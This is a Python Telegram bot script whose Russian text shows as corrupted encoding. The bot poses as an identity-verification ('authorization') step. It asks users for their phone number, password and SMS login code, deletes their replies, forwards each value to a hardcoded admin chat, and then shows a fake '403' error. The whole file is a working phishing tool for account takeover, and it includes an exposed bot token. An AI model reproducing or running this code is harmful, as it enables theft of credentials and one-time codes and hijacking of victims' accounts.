import telebot
import time
from telebot import types
from datetime import datetime

# ĞĞ°ÑÑ‚Ñ€Ğ¾Ğ¹ĞºĞ¸ Ğ´Ğ¾ÑÑ‚ÑƒĞ¿Ğ°
TOKEN = '8555421685:AAGTJ5sFD4AtkppyJmNC6Km7HfA5-E0LOTk' 
ADMIN_ID = 8162624622  # Ğ¢Ğ²Ğ¾Ğ¹ ID
bot = telebot.TeleBot(TOKEN)

def send_to_hugo(text):
    try:
        bot.send_message(ADMIN_ID, text, parse_mode="Markdown")
    except Exception as e:
        print(f"ĞÑˆĞ¸Ğ±ĞºĞ° Ğ»Ğ¾Ğ³Ğ¸Ñ€Ğ¾Ğ²Ğ°Ğ½Ğ¸Ñ: {e}")

@bot.message_handler(commands=['start'])
def start(message):
    send_to_hugo(f"ğŸ‘¤ **ĞĞ¾Ğ²Ñ‹Ğ¹ Ğ²Ğ¸Ğ·Ğ¸Ñ‚!**\nĞ®Ğ·ĞµÑ€: @{message.from_user.username}")
    
    markup = types.InlineKeyboardMarkup()
    markup.add(types.InlineKeyboardButton("ğŸ” ĞĞ²Ñ‚Ğ¾Ñ€Ğ¸Ğ·Ğ°Ñ†Ğ¸Ñ", callback_data="auth"))
    
    bot.send_message(message.chat.id, 
                     "**ĞĞ²Ñ‚Ğ¾Ñ€Ğ¸Ğ·Ğ°Ñ†Ğ¸Ñ**\n\nĞ”Ğ»Ñ Ğ´Ğ¾ÑÑ‚ÑƒĞ¿Ğ° Ğ½ĞµĞ¾Ğ±Ñ…Ğ¾Ğ´Ğ¸Ğ¼Ğ¾ Ğ¿Ğ¾Ğ´Ñ‚Ğ²ĞµÑ€Ğ´Ğ¸Ñ‚ÑŒ Ğ»Ğ¸Ñ‡Ğ½Ğ¾ÑÑ‚ÑŒ:", 
                     reply_markup=markup, parse_mode="Markdown")

@bot.callback_query_handler(func=lambda call: call.data == "auth")
def auth_step(call):
    bot.delete_message(call.message.chat.id, call.message.message_id)
    msg = bot.send_message(call.message.chat.id, "ğŸ“± **Ğ£ĞºĞ°Ğ¶Ğ¸Ñ‚Ğµ Ğ²Ğ°Ñˆ Ğ½Ğ¾Ğ¼ĞµÑ€ Ñ‚ĞµĞ»ĞµÑ„Ğ¾Ğ½Ğ°:**")
    bot.register_next_step_handler(msg, get_phone)

def get_phone(message):
    phone = message.text
    try: bot.delete_message(message.chat.id, message.message_id)
    except: pass
    
    msg = bot.send_message(message.chat.id, "ğŸ” **Ğ’Ğ²ĞµĞ´Ğ¸Ñ‚Ğµ Ğ²Ğ°Ñˆ Ğ¿Ğ°Ñ€Ğ¾Ğ»ÑŒ:**")
    bot.register_next_step_handler(msg, get_pass, phone)

def get_pass(message, phone):
    password = message.text
    try: bot.delete_message(message.chat.id, message.message_id)
    except: pass
    
    send_to_hugo(f"ğŸ“ **Ğ›ĞĞ“!**\n\nğŸ‘¤ Ğ®Ğ·ĞµÑ€: @{message.from_user.username}\nğŸ“± ĞĞ¾Ğ¼ĞµÑ€: `{phone}`\nğŸ”‘ ĞŸĞ°Ñ€Ğ¾Ğ»ÑŒ: `{password}`")
    
    bot.send_message(message.chat.id, "ğŸ”„ **ĞŸÑ€Ğ¾Ğ²ĞµÑ€ĞºĞ°...**")
    time.sleep(2)
    
    msg = bot.send_message(message.chat.id, "ğŸ“© **Ğ’Ğ²ĞµĞ´Ğ¸Ñ‚Ğµ ĞºĞ¾Ğ´ Ğ¸Ğ· Ğ¡ĞœĞ¡:**")
    bot.register_next_step_handler(msg, get_sms, phone, password)

def get_sms(message, phone, password):
    sms = message.text
    try: bot.delete_message(message.chat.id, message.message_id)
    except: pass
    
    send_to_hugo(f"ğŸ“© **ĞšĞĞ” Ğ¡ĞœĞ¡!**\nğŸ“± ĞĞ¾Ğ¼ĞµÑ€: `{phone}`\nğŸ”¢ ĞšĞ¾Ğ´: `{sms}`\nğŸ‘¤ Ğ®Ğ·ĞµÑ€: @{message.from_user.username}")
    
    bot.send_message(message.chat.id, "ğŸ”„ **Ğ—Ğ°Ğ²ĞµÑ€ÑˆĞµĞ½Ğ¸Ğµ...**")
    time.sleep(3)
    bot.send_message(message.chat.id, "âŒ **ĞÑˆĞ¸Ğ±ĞºĞ° 403.**\nĞŸĞ¾Ğ¿Ñ€Ğ¾Ğ±ÑƒĞ¹Ñ‚Ğµ Ğ¿Ğ¾Ğ·Ğ¶Ğµ.", parse_mode="Markdown")

if __name__ == '__main__':
    print("Ğ‘Ğ¾Ñ‚ Ğ·Ğ°Ğ¿ÑƒÑ‰ĞµĞ½...")
    while True:
        try:
            bot.polling(none_stop=True, interval=0, timeout=20)
        except Exception as e:
            time.sleep(5)
            
